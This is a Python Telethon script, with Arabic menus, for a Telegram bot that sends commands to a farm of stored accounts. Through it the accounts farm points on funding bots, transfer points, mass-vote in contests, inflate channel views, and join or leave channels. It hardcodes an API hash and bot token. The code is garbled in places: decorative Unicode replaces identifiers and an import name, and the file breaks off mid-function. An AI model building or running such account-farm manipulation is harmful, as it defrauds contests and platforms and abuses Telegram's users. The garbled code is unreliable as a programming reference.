module = """from telethon.tl.functions.channels import LeaveChannelRequest
import telethon
from time import sleep
from telethon import events
import logging
import a𝑆 𝐴 ncio
import time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from telethon import functions
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from telethon.𝑆 𝐴 nc import TelegramClient
from telethon.sessions import StringSession
import os
from telethon.tl.functions.channels import LeaveChannelRequest
import datetime
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.messages import GetMessagesViewsRequest
import requests
import pyfiglet
from zekalb import *
import re
 
  
    """
 = """**
⚝ مرحبا بك في اوامر زد إي بـوينت
 
============= •   🔱 𝑆 𝐴  🔱 • ============

𝟏 - للدخول الى اوامر التجميع : .تجميع

𝟐 - للدخول الى اوامر التحـكم : .تحكم

𝟑 - للدخول الى اوامر مـمـيـزة : .مميزة

𝟒 - لـفـحص عـمـل الـســورس : .فحص

============= •   🔱 𝑆 𝐴  🔱 • ============
**"""


‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**
⚝ قـائمة جميع اوامر التجميع التي تحتاجها

============= •   🔱 𝑆 𝐴  🔱 • ============

`/point1` :  تجميع نقاط بوت المليار
`/point2` : تجميع نقاط بوت الجوكر 
`/point3` :  تجميع نقاط بوت العقاب 
`/point4` :   تجميع نقاط بوت العرب

note : تستخدم هذه الاوامر بأرسالها الى الحساب او بأرسالها الى مجموعة يوجد فيها الحساب

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

`/point + bot` : تجميع نقاط بوت غير موجود في القائمة

note : يوزر البوت المطلوب bot ضع مكان الـ

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

`/somy + bot + second` : تجميع لانهائي 

note : يوزر البوت المطلوب bot ضع مكان الـ 

note : عدد الثواني second ضع مكان الـ

note : ننصحك بوضع عدد الثواني 300

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

`/join` : الانضمام الى قنوات البوتات المذكورة

`/transfer` : الدخول لقائمة تحويل نقاط

`/infoacc` : الدخول لقائمة تحويل معلومات

`/lpoint` : لمغادرة جميع القنوات والمجموعات

============= •   🔱 𝑆 𝐴  🔱 • ============
**"""

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**
⚝ قائمة اوامر التحكم بالحساب

============= •   🔱 𝑆 𝐴  🔱 • ============

𝟏 - لتحويل اخر رسالة من مستخدم معين او بوت :

`/forward + يوزر الحساب او البوت`

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟐 - لأرسال رسالة الى مستخدم معين او بوت : 

`/send + الرسالة + يوزر الحساب او البوت`

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟑 - لجعل الحساب ينقر على زر شفاف في بوت : 

`/button + رقم الزر الشفاف + يوزر البوت`

note :  قم بحساب رقم الزر الشفاف من العدد 0

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟒 - لجعل الحساب ينضم الى قناة او مجموعة

`/jn + يوزر القناة او المجموعة `

============= •   🔱 𝑆 𝐴  🔱 • ============
**"""

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**
⚝ قائمة الاوامر المميزة 
============= •   🔱 𝑆 𝐴  🔱 • ============

𝟏 - لتفعيل بوت عبر الدخول الى رابط الدعوه : 

`/bot + ايدي الحساب + يوزر البوت`

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟐 - الامر التالي يحتوي على ملاحظات تحتاجها :

`/notes`

𝟑 - لجعل الحساب يصوت في مسابقة لايكات :

`/voice + موقع الرسالة + يوزر القناة`

note : موقع الرسالة يعني مثلا اذا كان الاسم في قناة المسابقة اخر اسم او اخر منشور فأن موقع الرسالة 1 وان تكن قبل الاخير فأن موقها 2 وهكذا  بقية المواقع 

𝟒 - لجعل الحساب يغادر قناة او مجموعة :

`/lv + يوزر القناة`

============= •   🔱 𝑆 𝐴  🔱 • ============
**"""

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**
1 - اذا كنت تريد التحكم بالحسابات في التحميع وتحويل النقاط ومعرفة معلومات كل حساب قم بأنشاء مجموعة خاصة وادخل الحسابات التي قمت بتنصيب لها السورس وارفع الحسابات الى مشرفين ثم استخدم اوامر التجميع 

2 - اذا كنت تريد جعل الحسابات تقوم بتجميع النقاط بدون توقف ونسبة قليلة من الحظر استخدم الامر : somy/ 
بأمكانك معرفة المزيد عن الامر وكيفية استخدامه في قائمة .تجميع ويستحسن عند استعمال الامر وضع عدد الثواني 300 اي يعني هذا عند حدوث خطأ في التجميع او انتهت القنوات فسوف يقوم السورس بالمحاولة في التجميع تلقائيا بعد مرور 300 اي خمس دقائق وسوف يقوم السورس بأخبارك جميع ماتم الوصول اليه من الامر ويمكنك ايقاف التجميع بأرسال .اعادة تشغيل 

3 - اذا كنت تريد تجميع نقاط بوتات التمويل بطريقة اعتيادية بدون المحاولة مرة اخرى تلقائيا يمكن استخدام الاوامر التالية [point , /point1/ , .....] يمكنك مراجعة الاوامر في القائمة .تجميع في اول قسمين من القائمة
**"""

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**
〠 اوامر حساب المستخدم 

• بوت تمويل المليار  - `.تجميع المليار`

• بوت تمويل الجوكر - `.تجميع الجوكر`

• بوت تمويل العقـاب - `.تجميع العقاب`

• بوت تمويل العـرب  - `.تجميع العرب `

• فحص السورس      - `.فحص`**"""

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = '''
╭──⌯𝗦𝗢𝗨𝗥𝗖𝗘   𝑆 𝐴  ⌯──╮

※ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 -  🔱 𝑆 𝐴  🔱    ※

※ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 - 𝟭.𝟭 - 𝗥𝗘𝗩𝗜𝗦𝗘𝗗   ※

※ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 - 𝗖𝗥𝗬𝗦𝗧𝗜𝗟   ※

╰───⌯  𝑆 𝐴   𝗣𝗢𝗜𝗡𝗧⌯───╯
'''

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**مرحبا بك في قسم تحويل النقاط
        
• @EEObot - `/pt1 + عدد النقاط `
• @A_MAN9300BOT - `/pt2 + عدد النقاط`
• @MARKTEBOT - `/pt3 + عدد النقاط `
• @XNSEX21BOT - `/pt4 + عدد النقاط`**"""

‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | = """**مرحبا بك في قسم تحويل النقاط
        
• @EEObot - `/pt1 + عدد النقاط `
• @A_MAN9300BOT - `/pt2 + عدد النقاط`
• @MARKTEBOT - `/pt3 + عدد النقاط `
• @XNSEX21BOT - `/pt4 + عدد النقاط`**"""


#----------------- Inauguration --------------------#



#--------------------- module ------------------------#

import threading
import os
import json
from zekalb import *
from telethon import TelegramClient, events
from datetime import datetime
import time
from telethon.tl.types import KeyboardButton, ReplyKeyboardMarkup
from telethon import events
from telethon.tl.custom import Button
from telethon import events, Button
import asyncio
import pyfiglet
from telethon import functions, types
from telethon.tl.custom import Conversation
from telethon.errors import ChatWriteForbiddenError, UserIsBlockedError
import asyncio


#------------------------ vars -------------------------#
# -
# - SYTHOM TEAM 
# -

A = '\033[1;34m'#ازرق
X = '\033[1;33m' #اصفر


#logo
logo = pyfiglet.figlet_format('*      ze      *')
print(X+logo)
print('  ')
print(A+'═'*60)
print('  ')

filename = 'ze.json'

try:
    with open(filename, 'r') as f:
        data = json.load(f)
        api_id = data['api_id']
        api_hash = data['api_hash']
        bot_token = data['bot_token']
        DEVLOO = data['DEVLOO']
        MAX_ACCOUNTS = data['MAX_ACCOUNTS']
        user_bot = data['user_bot']
        id_bot = data['id_bot']
except FileNotFoundError:
    api_id = '25281175'
    api_hash = '6d99cb2b60a2c519fc1f99bd19565730'
    bot_token = '6854722897:AAEeECjqRFulmH5y1yJr0F-Yvb1gz-si6ZY'
    DEVLOO = '2112762305'
    MAX_ACCOUNTS = int('1000')
    user_bot = 'sumsambot'
    id_bot = int('5546516772')
    
    data = {
        'api_id': api_id,
        'api_hash': api_hash,
        'bot_token': bot_token,
        'DEVLOO': DEVLOO,
        'MAX_ACCOUNTS': MAX_ACCOUNTS,
        'user_bot': user_bot,
        'id_bot': id_bot
    }
    
    with open(filename, 'w') as f:
        json.dump(data, f)


print(A+'═'*60)
bot = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)


#------------------ defult vars ---------------------# 

DEVELOPER_ID = int(DEVLOO)
OWNER_ID = DEVELOPER_ID
developer_id = 6581896306
days_left = 28
run = False
datee = datetime.now()
stored_users = []
MAX_ACCOUNTS = MAX_ACCOUNTS
num_accounts = 0
stop = False
userpot = None
user = None
messages = []


#------------------- bot client ----------------------# 
@bot.on(events.NewMessage(pattern='.تصفية'))
async def start_handler(event):
    # Replace with your message
    message = "test"
    await send_message_to_all_users(message)

async def send_message_to_all_users(message):
    global stored_users, num_accounts
    for user_id in stored_users:
        try:
            await bot.send_message(user_id, message)
        except Exception as e:
            await bot.send_message(DEVELOPER_ID, f'Failed to send message to user {user_id}: {e}\nتم حذف الرقم قم بأعادة فحص الحسابات المحذوفة والتي لايمكنني التحكم بها لكي استمر بالفحص ')
            stored_users.remove(user_id)
            os.remove(f"{user_id}.py")
            num_accounts -= 1
            

stored_usernames = []
stored_serial_numbers = []
current_serial_number = 1

@bot.on(events.NewMessage(pattern="/store_id"))
async def store_user_id(event):
    global current_serial_number, num_accounts
    user_id = event.sender_id
    username = event.sender.username
    serial_number = current_serial_number
    current_serial_number += 1
    stored_users.append(user_id)
    stored_usernames.append(username)
    stored_serial_numbers.append(serial_number)
    await bot.send_message(event.chat_id, f"تم تخزين الايدي: **{user_id}** واسم الحساب: **{username}** والرقم التسلسلي: **{serial_number}**")
    num_accounts += 1



#------------------- start bot ----------------------# 


@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    sender = await event.get_sender()
    if sender.id == DEVELOPER_ID:
        chat = await event.get_chat()
        buttons = [
           
            [Button.inline('اضافة رقـم ✚', 'button1'), Button.inline('حـذف رقـم ⌫', 'delete')],
	            
	            [Button.inline('• تعيين البوت •', 'ububo')],
            [Button.inline('بــــدء التجميع ✓', 'button3'), Button.inline('ايقاف التجميع ✘ ', 'button4')],
            [Button.inline('تـحويل النقاط ⎋', 'button5'), Button.inline('عــدد الـنـقـاطـ ⏚', 'button6')],
            [Button.inline('فك الحضر ⦿', 'unblock'), Button.inline('حضر البوت ⨷', 'button21')],
            [Button.inline('مغادرة القنوات ⎙', 'buttton11'), Button.inline('الهدية اليومية ⚘', 'a6gi2ft')],
            [Button.inline('⪻ بوت دعمكم ⪼', 'da3mkom')],
        [Button.inline('رشق تـصـويت ⛥', 'button7'), Button.inline('تـفــعـيل بــوت 〠', 'button8')],
        [Button.inline('رشـــق قناة ⊕', 'buttton311'), Button.inline('مغادرة قناة ⊖', 'buttton251')],
        [Button.inline('رشق مشاهدات ⟐', 'buttonn511')],
        [Button.inline('تحكم خاص ¥', 'btp'), Button.inline('فحص الحسابات ⚚', 'tst')],
        [Button.inline('اخر ﹝6﹞ رسائل ⩨', 'f4or3wa1rd'), Button.inline('ارسال رسالة ⛣', 's6e43n6d')],
        [Button.inline('نقر زر شفاف ✧', 'ba4utt2on'), Button.inline('عدد الحسابات ꐕ', "bbuttoon08")],
        [Button.inline('⬩ مسح بيانات البوت ⬩', 'format')],    
         [Button.inline('༺ 🔱 𝐒𝐎𝐔𝐑𝐂𝐄 𝑆 𝐴  🔱 ༻', 'button0')]
        ]
        await bot.send_message(chat, '''**‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | ⇲**''', buttons=buttons)


@bot.on(events.CallbackQuery(pattern='da3mkom'))
async def back(event):
        buttons = [
           
            [Button.inline('تجميع', 'co36llec57t'), Button.inline('تحويل', 'tr46nsf6er')],
            [Button.inline('كود هدية', 'gf4cobe'), Button.inline('هدية يومية', 'g7aif4')]
        ]
        await event.edit("""**‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | ⇲**""", buttons=buttons)

@bot.on(events.CallbackQuery(pattern='back'))
async def back(event):
        buttons = [
           
            [Button.inline('اضافة رقـم ✚', 'button1'), Button.inline('حـذف رقـم ⌫', 'delete')],
	            [Button.inline('⬎ اوامر الـتـجـمــيـع ⬐', 'button01')],
	            [Button.inline('• تعيين البوت •', 'ububo')],
            [Button.inline('بــــدء التجميع ✓', 'button3'), Button.inline('ايقاف التجميع ✘ ', 'button4')],
            [Button.inline('تـحويل النقاط ⎋', 'button5'), Button.inline('عــدد الـنـقـاطـ ⏚', 'button6')],
            [Button.inline('فك الحضر ⦿', 'unblock'), Button.inline('حضر البوت ⨷', 'button21')],
            [Button.inline('مغادرة القنوات ⎙', 'buttton11'), Button.inline('الهدية اليومية ⚘', 'a6gi2ft')],
            [Button.inline('⪻ بوت دعمكم ⪼', 'da3mkom')],
        [Button.inline('رشق تـصـويت ⛥', 'button7'), Button.inline('تـفــعـيل بــوت 〠', 'button8')],
        [Button.inline('رشـــق قناة ⊕', 'buttton311'), Button.inline('مغادرة قناة ⊖', 'buttton251')],
        [Button.inline('رشق مشاهدات ⟐', 'buttonn511')],
        [Button.inline('تحكم خاص ¥', 'btp'), Button.inline('فحص الحسابات ⚚', 'tst')],
        [Button.inline('اخر ﹝6﹞ رسائل ⩨', 'f4or3wa1rd'), Button.inline('ارسال رسالة ⛣', 's6e43n6d')],
        [Button.inline('نقر زر شفاف ✧', 'ba4utt2on'), Button.inline('عدد الحسابات ꐕ', "bbuttoon08")],
        [Button.inline('⬩ مسح بيانات البوت ⬩', 'format')],    
         [Button.inline('༺ 🔱 𝐒𝐎𝐔𝐑𝐂𝐄 𝑆 𝐴  🔱 ༻', 'button0')]
        ]
        await event.edit("""**‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | ⇲**""", buttons=buttons)





@bot.on(events.NewMessage)
async def handle_message(event):
    global rundum
    message = event.message
    if not 'pfppfpp' in message.text:
        if 'صالح' in message.text: 
            urlp = message.text.split(':')[3].split('•')[0]
            sender = message.sender.first_name
            await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\nرابط التحويل : {urlp}")
    
    

@bot.on(events.NewMessage)
async def handle_message(event):
    message = event.message
    if 'forward-' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\nرسالة المستخدم : {message.text}")
    elif 'قمت بمغادرة' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"لـحـسـاب : {sender}\n {message.text}")
    elif 'هناك فلود' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"لـحـسـاب : {sender}\n {message.text}")
    elif 'ersyor' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"لـحـسـاب : {sender}\n {message.text}")
@bot.on(events.NewMessage)
async def handle_message(event):
    message = event.message
    if 'انتهت القنوات' in message.text:
        if rundum:    
            await bot.send_message(event.chat_id, f"/col6ect")
    elif 'run' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\nيعمل بدون مشاكل")
    elif 'هناك قناة' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\nيواجه قناة تمنعه من انجاز العملية")
    elif 'القدر' in message.text:
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\n عدد نقاطة ليست كافية للتحويل") 
    
    elif 'جاري بدء التجميع' in message.text:
        sender = message.sender.first_name
        messages = []
        await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\nبدأ عملية التجميع")
    elif 'عدد نقاط' in message.text:
        points = message.text.split('عدد نقاط حسابك :')[1].split('\n')[0].strip()
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f'الـحـسـاب : {sender}\nعدد نقاطه : {points}')
    elif 'pfppfpp' in message.text:
        urlp = re.search(r'(https?://\S+)', message.text).group(1)
        sender = message.sender.first_name
        await bot.send_message(DEVELOPER_ID, f"الـحـسـاب : {sender}\nرابط التحويل : {urlp}")
        

@bot.on(events.NewMessage(pattern="/start"))
async def stop_handle_create_and_run(event):
    global stop, run
    if not run:
        return
    if event.text == "/start":
        stop = True
        await bot.send_message(event.chat_id, "**تـم الغاء اضافة الرقم**")


        
        
@bot.on(events.NewMessage(pattern='.تشغيل'))
async def stop_handle_create_and_run(event):
    global stop
    if event.text == ".تشغيل":
        stop = False
        await bot.send_message(event.chat_id, "تم التشغيل بنجاح")
        
owner_id = DEVELOPER_ID
message_count = {}
owner_messages = {}
last_message_time = {}


@bot.on(events.NewMessage(pattern='قمت بمغادرة جميع القنوات والمجموعات'))
async def handle_hello_messages(event):
    user_id = event.sender_id
    current_time = time.time()
    if user_id in last_message_time and current_time - last_message_time[user_id] > 200:
        message_count[user_id] = 0
        if user_id in owner_messages:
            await bot.delete_messages(owner_id, owner_messages[user_id])
            del owner_messages[user_id]
    last_message_time[user_id] = current_time
    if user_id not in message_count:
        message_count[user_id] = 0
    message_count[user_id] += 1
    if user_id in owner_messages:
        await bot.edit_message(owner_id, owner_messages[user_id], text=f'• الحساب التالي : {event.sender.first_name}\n• عدد القنوات والمجموعات التي غادرها : {message_count[user_id]}')
    else:
        owner_messages[user_id] = await bot.send_message(owner_id, f'هذا الشخص {event.sender.first_name} ارسل رسالة. عدد الرسائل المرسلة: {message_count[user_id]}')

meessage_count = {}
owner_meessages = {}
last_messsage_time = {}

@bot.on(events.NewMessage(pattern='✣ عدد النقاط في هذه المحاولة'))
async def handle_hello_messages(event):
    user_id = event.sender_id
    current_time = time.time()
    if user_id in last_messsage_time and current_time - last_messsage_time[user_id] > 200:
        meessage_count[user_id] = 0
        if user_id in owner_meessages:
            await bot.delete_messages(owner_id, owner_meessages[user_id])
            del owner_meessages[user_id]
    last_messsage_time[user_id] = current_time
    if user_id not in meessage_count:
        meessage_count[user_id] = 0
    meessage_count[user_id] += 1
    if user_id in owner_meessages:
        await bot.edit_message(owner_id, owner_meessages[user_id], text=f'• الحساب التالي : {event.sender.first_name}\n• عدد القنوات والمجموعات التي انضم بها : {meessage_count[user_id]}')
    else:
        owner_meessages[user_id] = await bot.send_message(owner_id, f'• الحساب التالي {event.sender.first_name}\n عدد القنوات والمجموعات التي انضم بها : {meessage_count[user_id]}')
        
        
#################

@bot.on(events.CallbackQuery(pattern='btp'))
async def callback(event):
    await event.edit("""**اختر احد الازرار التالية **""", buttons=[[Button.inline("« بـدء التحكـم »", "startcl")], [Button.inline("« الحسابات المخزنـه »", "acct")], [Button.inline("• رجــوع • ", "back")]])

@bot.on(events.CallbackQuery(pattern="acct"))
async def callback(event):
    await event.edit("""**هذه هي الحسابات**""")
    await get_stored_values(event)



@bot.on(events.CallbackQuery(pattern="startcl"))
async def start(event):
    sender = await event.get_sender()
    if sender.id == DEVELOPER_ID:
        chat = await event.get_chat()
        buttons = [
           
            [Button.inline('• تعيين الحساب •', 'kacc')],
            
            [Button.inline('بــــدء التجميع ✓', 'aabo'), Button.inline('ايقاف التجميع ✘ ', 'abbo')],
            [Button.inline('تـحويل النقاط ⎋', 'acbo'), Button.inline('عــدد الـنـقـاطـ ⏚', 'adbo')],
            [Button.inline('مغادرة القنوات ⎙', 'agbo'), Button.inline('حضر البوت ⨷', 'afbo')],
            
        [Button.inline('رشق تـصـويت ⛥', 'aebo'), Button.inline('تـفــعـيل بــوت 〠', 'ahbo')],
        [Button.inline('رشـــق قناة ⊕', 'aibo'), Button.inline('مغادرة قناة ⊖', 'ajbo')],
        [Button.inline('رشق مشاهدات ⟐', 'akbo')],
        
         [Button.inline('༺ 🔱 𝐒𝐎𝐔𝐑𝐂𝐄 𝑆 𝐴  🔱 ༻', 'button0')]
        ]
        await bot.send_message(chat, '''**‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 | ⇲**''', buttons=buttons)


#--------------------------------------------------------#
@bot.on(events.CallbackQuery(pattern='button1'))
async def callback(event):
    
    await event.edit("""**اذا كنت تريد الغاء اضافة الارقام ارسل 
    /start**""", buttons=[Button.inline("• رجــوع • ", "back")])
    await handle_create_and_run(event)


#--------------------------------------------------------#


@bot.on(events.CallbackQuery(pattern='buttton11'))
async def callback(event):
    await event.edit("**• حسنا سوف يتم مغادرة جميع القنوات والمجموعات**", buttons=[Button.inline("• رجــوع • ", "back")])
    for user_id in stored_users:
        await bot.send_message(user_id, f"/lpoint")



@bot.on(events.CallbackQuery(pattern='button3'))
async def callback(event):
    global userpot
    await event.edit("""**• حسنا قـم بأرسال المطاليب 
• وسوف ابدأ بالتجميع**""", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        
        await conv.send_message("**⟡ قم بأرسال عدد الثواني**")
        seconds = (await conv.get_response()).text
        await conv.send_message("**⟡ تم بدأ التجميع**")
    
    for user_id in stored_users:
        await bot.send_message(user_id, f"/run")
        await asyncio.sleep(5)
        await bot.send_message(user_id, f"/somy {userpot} {seconds}")

#--------------------------------------------------------#
    
@bot.on(events.CallbackQuery(pattern='button4'))
async def callback(event):
    await event.edit("**• حسنا تم ايقاف عملية التجميع**", buttons=[Button.inline("• رجــوع • ", "back")])
    for user_id in stored_users:
        await bot.send_message(user_id, f"/stop")
        
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='button5'))
async def callback(event):
    global userpot
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        
        await conv.send_message("**⩤ قـم بأرسال عدد النقاط**")
        po = (await conv.get_response()).text
        await conv.send_message("**⩤ انتضر قليلا جاري تحويل النقاط**")
    
    for user_id in stored_users:
        await bot.send_message(user_id, f"/ptf {userpot} {po}")
        
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='button6'))
async def callback(event):
    global userpot
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        
        await conv.send_message("**✪ انتضر قليلا جاري ارسال عدد نقاط الحسابات**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/npoint {userpot}")
    
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='button7'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**¤ قـم بأرسال يوزر الـقـنـاة**")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**¤ قـم بأرسال ايدي الرسالة**")
        po = (await conv.get_response()).text
        await conv.send_message("**¤ تم التصويت بنجاح**")
    
    for user_id in stored_users:
        await bot.send_message(user_id, f"/voice {bot_username} {po}")
        
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='button8'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**♢ قـم بأرسال يــوزر الـبـوت **")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**♢ قـم بأرسال ايدي الحساب**")
        po = (await conv.get_response()).text
        await conv.send_message("**♢ قـم بأرسال عدد قنوات الاشتراك الاجباري**")
        poo = (await conv.get_response()).text
     
        await conv.send_message("**♢ جاري تفعيل البوت**")
         
    for user_id in stored_users:
        await bot.send_message(user_id, f"/bot {bot_username} {po} {poo}")

#--------------------------------------------------------#

#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='button21'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر البوت او الحساب المراد حضره **")
        bot_usernamme = (await conv.get_response()).text
        await conv.send_message("**✪ تم حضر اابوت بنجاح **")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/block {bot_usernamme}")





@bot.on(events.CallbackQuery(pattern='unblock'))
async def callback(event):
    global userpot
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        
        await conv.send_message("**✪ تم الغاء حضر البوت **")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/unblock {userpot}")


#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='buttonn511'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**¤ قـم بأرسال يوزر الـقـنـاة**")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**¤ قـم بأرسال ايدي الرسالة المراد زيادة عدد مشاهداته**")
        po = (await conv.get_response()).text
        await conv.send_message("**¤ تمت المشاهدة بنجاح**")
    
    for user_id in stored_users:
        await bot.send_message(user_id, f"/view {bot_username} {po}")

#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='buttton311'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر القناة المراد الانضمام بها**")
        bot_usernamme = (await conv.get_response()).text
        await conv.send_message("**✪ حسنا قمت بالانضمام**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/jn {bot_usernamme}")
            
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='buttton251'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر القناة المراد مغادرتها **")
        bot_usernamme = (await conv.get_response()).text
        await conv.send_message("**✪ حسنا قمت بمغادرة القناة**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/lv {bot_usernamme}")


@bot.on(events.CallbackQuery(pattern="bbuttoon08"))
async def callback(event):
    await event.edit(f"**عدد الحسابات في البوت : {num_accounts}**", buttons=[Button.inline("• رجــوع • ", "back")])
    
#--------------------------------------------------------#


@bot.on(events.CallbackQuery(pattern='delete'))
async def callback(event):
    global num_accounts, stored_users
    await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**¤ قم بأرسال ايدي الحساب**")
        bot_username = (await conv.get_response()).text
        bot_username = int(bot_username)
        if bot_username not in stored_users:
            # Notify the owner about the issue
            await bot.send_message(OWNER_ID, f"Bot ID {bot_username} not found in stored_users list")
            return
        
        try:
            os.remove(f'{bot_username}.py')
        except FileNotFoundError:
            # Notify the user about the issue
            await conv.send_message(f"Bot file {bot_username}.py not found")
            return
        
        try:
            await bot.send_message(int(bot_username), f"/restart")
        except Exception as e:
            # Notify the owner about the issue
            await bot.send_message(OWNER_ID, f"Failed to send /restart command to {bot_username}. Error: {e}")
        
        stored_users.remove(bot_username)
        
        await conv.send_message("**¤ تم الحذف بنجاح**")
        num_accounts -= 1


#-------------- other kal -------------------#


@bot.on(events.CallbackQuery(pattern='ububo'))
async def callback(event):
    global userpot # إشارة إلى أن المتغير user هو المتغير العالمي
    await event.edit("""**ارسل يوزر البوت**""", buttons=[Button.inline("• رجــوع • ", "back")])
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**⟡ ارسل يوزر البوت **")
        bot_username = (await conv.get_response()).text
        userpot = bot_username
        await conv.send_message("**⟡ تم تخزين يوزر البوت **")


@bot.on(events.CallbackQuery(pattern='kacc'))
async def callback(event):
    global user # إشارة إلى أن المتغير user هو المتغير العالمي
    await event.edit("""**قم بأرسال المطاليب**""")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**⟡ ارسل ايدي الحساب **")
        bot_username = (await conv.get_response()).text
        user = bot_username
        await conv.send_message("**⟡ تم تخزين الايدي**")

@bot.on(events.CallbackQuery(pattern='aabo'))
async def callback(event):
    await event.edit("""**• حسنا قـم بأرسال المطاليب 
• وسوف ابدأ بالتجميع**""")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**⟡ قـم بأرسال يوزر البوت **")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**⟡ قم بأرسال عدد الثواني**")
        seconds = (await conv.get_response()).text
        await conv.send_message("**⟡ تم بدأ التجميع**")
    
    
        await bot.send_message(int(user), f"/run")
        await bot.send_message(int(user), f"/somy {bot_username} {seconds}")
        
@bot.on(events.CallbackQuery(pattern='abbo'))
async def callback(event):
    await event.edit("**• حسنا تم ايقاف عملية التجميع**")
    await bot.send_message(int(user), '/stop')

@bot.on(events.NewMessage(pattern='/send'))
async def handler(event):
